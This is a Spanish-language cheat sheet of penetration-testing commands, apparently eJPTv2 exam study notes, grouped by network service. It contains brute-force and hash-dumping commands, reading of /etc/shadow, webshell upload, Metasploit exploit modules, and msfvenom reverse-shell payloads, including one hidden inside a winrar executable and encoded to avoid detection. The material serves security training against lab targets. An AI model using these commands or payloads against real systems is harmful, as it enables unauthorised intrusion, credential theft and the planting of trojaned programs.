# Documentación: Comandos de enumeración

## Descripción
Esta documentación proporciona una introducción básica de los comandos útlices para el examen EJPTv2

### FTP File Transfer Protocol - 21
El Protocolo de Transferencia de Archivos (FTP) es un estándar de red para transferir archivos entre sistemas, operando en el puerto 21. Aunque es antiguo y carece de seguridad, permite cargar y descargar archivos en servidores remotos

```python
nmap -p21 --script ftp-anon IP
wget -m --no-passive ftp://anonymous:anonymous@IP
sudo nmap -sV -p21 -sC -A IP
nc IP 21
```

#### Diccionarios
Lista de palabras para ataques de fuerza bruta

```python
/usr/share/metasploit-framework/data/wordlists/common_users.txt
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

##### Metasploit
Utilidades de la herramienta todo terreno carnal

```python
use exploit/unix/ftp/vsftpd_234_backdoor
```

### Server Message Block (SMB) - 137,138,139,445
Server Message Block (SMB) es un protocolo de red que facilita el intercambio de archivos, impresoras y recursos entre sistemas. Opera en los puertos 137, 138, 139 y 445. A pesar de su utilidad, el puerto 445 es conocido por vulnerabilidades de seguridad.

```python
smbclient -N -L //IP (list shares)
nmap -sV -sC -p 445 IP
smbclient //IP/notes (connecting shares)
sudo nmap IP -sV -sC -p139,445
rpcclient -U "" IP (srvinfo, enumdomains, querydominfo, netshareenumall, enumdomusers)
smbmap -H IP -u "" -p "" (para revisar que permisos)
smbmap -H IP -u administrator -p smbserver_771 -x 'ipconfig'
smbmap -H IP -u Administrator -p 'smbserver_771' -r 'C$'
smbmap -H IP -u Administrator -p 'smbserver_771' --download 'C$\flag.txt'
crackmapexec smb IP --shares -u '' -p '' (revisar permisos)
./enum4linux-ng.py IP -A
enum4linux -u vagrant -p vagrant -U IP (enumerar usuarios)
nmap -p445 --script smb-protocols IP
nmap -p445 --script smb-security-mode IP
nmap -p445 --script smb-enum-sessions IP
nmap --script smb-os-discovery -p445 IP
enum4linux -r -u "admin" -p "password1" IP (obtener el ssid de los usuarios)
cp /usr/share/doc/python3-impacket/examples/psexec.py /root/Desktop

Tools: 
Psexec - conexión para smb que nos brinda shell
https://github.com/fortra/impacket/blob/master/examples/psexec.py
```

#### Diccionarios
Lista de palabras para ataques de fuerza bruta

```python
/usr/share/metasploit-framework/data/wordlists/common_users.txt
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
/usr/share/wordlists/metasploit/unix_passwords.txt
/usr/share/wordlists/metasploit/unix_users.txt
/usr/share/wordlists/rockyou.tx
```

##### Metasploit
Utilidades de la herramienta todo terreno carnal

```python
exploit/linux/samba/is_known_pipename
search ms17_010
```

### Secure Shell (SSH) - 22
Secure Shell (SSH) es un protocolo de red seguro que permite la comunicación y el acceso remoto a sistemas mediante el cifrado de datos. Utiliza el puerto 22 para establecer conexiones seguras y autenticadas, garantizando la confidencialidad y la integridad de la información transmitida.

```python
nmap --script ssh2-enum-algos IP
nmap --script ssh-hostkey --script-args ssh_hostkey=full IP
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=student" IP
find / -name "flag" (busca bandera)
```

#### Diccionarios
Lista de palabras para ataques de fuerza bruta

```python
/usr/share/metasploit-framework/data/wordlists/common_users.txt
/usr/share/metasploit-framework/data/wordlists/common_passwords.txt
```

##### Metasploit
Utilidades de la herramienta todo terreno carnal

```python
use auxiliary/scanner/ssh/libssh_auth_bypass
```

### HTTP - 80
Hypertext Transfer Protocol (HTTP) es el protocolo estándar de la web para la comunicación entre navegadores y servidores. Opera en el puerto 80, permitiendo la solicitud y transferencia de contenido web, como páginas, imágenes y otros recursos, a través de conexiones no cifradas.

```python
whatweb IP
http IP
dirb http://IP
nmap --script http-headers -sV -p 80 IP
nmap -sV -script banner IP
nmap –script http-enum -sV -p80 IP
nmap –script http-headers -sV -p80 IP
nmap --script http-methods --script-args http-methods.url-path=/webdav/ IP
curl http://IP/
auxiliary/scanner/http/apache_userdir_enum
auxiliary/scanner/http/brute_dirs
auxiliary/scanner/http/dir_scanner
auxiliary/scanner/http/dir_listing
auxiliary/scanner/http/http_put
auxiliary/scanner/http/files_dir
auxiliary/scanner/http/http_login
auxiliary/scanner/http/http_header
auxiliary/scanner/http/http_version
auxiliary/scanner/http/robots_txt
```

#### Diccionarios
Lista de palabras para ataques de fuerza bruta

```python
/usr/share/metasploit-framework/data/wordlists/namelist.txt
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
/usr/share/metasploit-framework/data/wordlists/common_users.txt
```

##### Metasploit
Utilidades de la herramienta todo terreno carnal

```python
use auxiliary/scanner/http/http_version
use exploit/unix/http/xdebug_unauth_exec
exploit/unix/webapp/xoda_file_upload
exploit/windows/http/badblue_passthru
exploit/multi/http/apache_mod_cgi_bash_env_exec (shellshock - cgi)
```

### MYSQL 3306
MySQL es un sistema de gestión de bases de datos relacional ampliamente utilizado. Utiliza el puerto 3306 para permitir conexiones entre aplicaciones y bases de datos, facilitando el almacenamiento y recuperación eficiente de datos estructurados.

```python
select load_file("/etc/shadow");
mysql -h IP -u root
use auxiliary/scanner/mysql/mysql_hashdump
nmap --script=mysql-empty-password -p 3306 IP
nmap --script=mysql-info -p 3306 IP
nmap --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" -p 3306 IP
nmap --script mysql-dump-hashes --script-args="username='root',password=''" -p 3306 IP
hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt IP mysql
hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt IP mysql
```

#### Diccionarios
Lista de palabras para ataques de fuerza bruta

```python
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

##### Metasploit
Utilidades de la herramienta todo terreno carnal

```python
use auxiliary/scanner/mysql/mysql_hashdump
use auxiliary/scanner/mysql/mysql_login
```

### MSSQL - 1433
Microsoft SQL Server (MSSQL) es un sistema de gestión de bases de datos relacionales desarrollado por Microsoft. Opera en el puerto 1433, facilitando la comunicación entre aplicaciones y bases de datos, permitiendo el almacenamiento y acceso a datos estructurados, con énfasis en la integración con el ecosistema de Microsoft.

```python
nmap --script ms-sql-info -p 1433 IP
nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 IP
nmap -p 1433 --script ms-sql-empty-password IP
nmap -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" IP -oN output.txt
nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria IP
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig" IP
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" IP
```

#### Diccionarios
Lista de palabras para ataques de fuerza bruta

```python
No hay en este caso
```

##### Metasploit
Utilidades de la herramienta todo terreno carnal

```python
use auxiliary/scanner/mssql/mssql_login
set RHOSTS IP set USER_FILE /root/Desktop/wordlist/common_users.txt
set PASS_FILE /root/Desktop/wordlist/100-common-passwords.txt
set VERBOSE false
use auxiliary/admin/mssql/mssql_enum
use auxiliary/admin/mssql/mssql_enum_sql_logins
use auxiliary/admin/mssql/mssql_exec (set CMD whoami)
use auxiliary/admin/mssql/mssql_enum_domain_accounts
```

### WebDAV - 80/443
WebDAV (Web Distributed Authoring and Versioning) es una extensión del protocolo HTTP que permite la colaboración y la edición remota de archivos en servidores web. Opera en los puertos 80 y 443, posibilitando el acceso y la gestión de archivos a través de conexiones no cifradas (80) y cifradas (443) en entornos seguros.

```python
DavTest (tool) - valida que archivo se puede cargar
Cadaver (tool) - para cargar archivos 
nmap -p80 -sV --script http-enum IP (1)
Open site web (2)
davtest -auth bob:password_123321 -url http://IP/webdav/ (3)
cadaver http://IP/webdav/ (4) - autenticarse
put /usr/share/webshells/asp/webshell.asp (5) - subir la carga shell
more C:\flag.txt
Generar Shell Inverso
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=1234 -f asp > shell.asp
use exploit/multi/handler or listen shell
```

#### Diccionarios
Lista de palabras para ataques de fuerza bruta

```python
No hay en este caso
```

##### Metasploit
Utilidades de la herramienta todo terreno carnal

```python
use exploit/multi/handler
```

### WinRm - 5985,5986 (this port no int common port 1000)
WinRM (Windows Remote Management) es un protocolo desarrollado por Microsoft para la administración remota de sistemas Windows. Utiliza los puertos 5985 y 5986 para la comunicación no cifrada y cifrada, respectivamente. Estos puertos permiten la ejecución de comandos y la administración de sistemas Windows de forma remota, ofreciendo una alternativa a otros protocolos como SSH en entornos Windows.

```python
nmap -p5985,5986 IP
crackmapexec winrm IP -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt (fuerza bruta pssword)
evil-winrm.rb -u 'administrator' -p 'tinkerbell' -i IP (conectarnos remoto)
```

#### Diccionarios
Lista de palabras para ataques de fuerza bruta

```python
/usr/share/metasploit-framework/data/wordlists/common_users.txt
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

##### Metasploit
Utilidades de la herramienta todo terreno carnal

```python
auxiliary/scanner/winrm/winrm_login
auxiliary/scanner/winrm/winrm_cmd
exploit/windows/winrm/winrm_script_exec (set FORCE_VBS true)
use exploit/windows/winrm/winrm_script_exec (acceder al sistema)
```

### RDP 3389 | 3333
El Protocolo de Escritorio Remoto (RDP) se utiliza para la administración remota de sistemas Windows. Opera en los puertos 3389 (predeterminado) y 3333, permitiendo a los usuarios conectarse a una máquina de forma remota para interactuar con su interfaz gráfica y ejecutar aplicaciones como si estuvieran localmente presentes en el sistema remoto.

```python
nmap -sV -sC IP
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://IP -s 3333
xfreerdp /u:administrator /v:IP:3333 /p:qwertyuiop
```

#### Diccionarios
Lista de palabras para ataques de fuerza bruta

```python
/usr/share/metasploit-framework/data/wordlists/common_users.txt
/usr/share/metasploit-framework/data/wordlists/unix_passwords.tx
```

##### Metasploit
Utilidades de la herramienta todo terreno carnal

```python
Exploiting Windows CVE-2019-0708 RDP Vulnerability (BlueKeep)
post/windows/manage/enable_rdp (habilitar rdp em msfconsole
```

### SMTP SERVICE - 25
El Servicio de Transferencia de Correo Simple (SMTP) opera en el puerto 25 y es un protocolo fundamental para el envío de correos electrónicos en redes. Facilita la transferencia de mensajes entre servidores de correo, permitiendo la comunicación global mediante el enrutamiento y entrega de mensajes electrónicos a través de Internet.

```python
nmap -sV -script banner IP
nc IP
VRFY admin@openmailbox.xyz (en la coneccion de nc o telnet podemos validar esto)
VRFY commander@openmailbox.xyz
telnet IP 25
HELO attacker.xyz 
EHLO attacker.xyz
smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t IP
```

#### Diccionarios
Lista de palabras para ataques de fuerza bruta

```python
/usr/share/metasploit-framework/data/wordlists/unix_users.txt
```

##### Metasploit
Utilidades de la herramienta todo terreno carnal

```python
exploit/linux/smtp/haraka (set SRVPORT 9898, set email_to root@attackdefense.test, set payload linux/x64meterpreter_reverse_http, set rhosts, set lhosts)
use auxiliary/scanner/smtp/smtp_enum
search type:auxiliary name:smtp (con esto enumeramos en msfconsole para enumerar smtp)
Example - exploit haraka:
use exploit/linux/smtp/haraka
set SRVPORT 9898
set email_to root@attackdefense.test
set payload linux/x64/meterpreter_reverse_http
set rhost 192.150.137.3
set LHOST 192.150.137.2
exploit
```

### MSFVENOM
Es una herramienta de la suite de Metasploit Framework que se utiliza para generar payloads (cargas útiles) de código malicioso. Estas cargas útiles pueden ser utilizadas en exploits y ataques cibernéticos con fines de pruebas de penetración o seguridad. msfvenom permite personalizar y crear payloads específicos para diferentes escenarios y objetivos, incluyendo la infección de sistemas con malware o la explotación de vulnerabilidades conocidas.

#### Windows

```python
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > payloadx86.exe
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > payloadx86.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > encodedx86.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe -k -x /Downloads/winrar32.exe > winra.exe
```

#### Linux

```python
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f elf > payloadx86
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f elf > payloadx64
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f elf > encodedx86
```
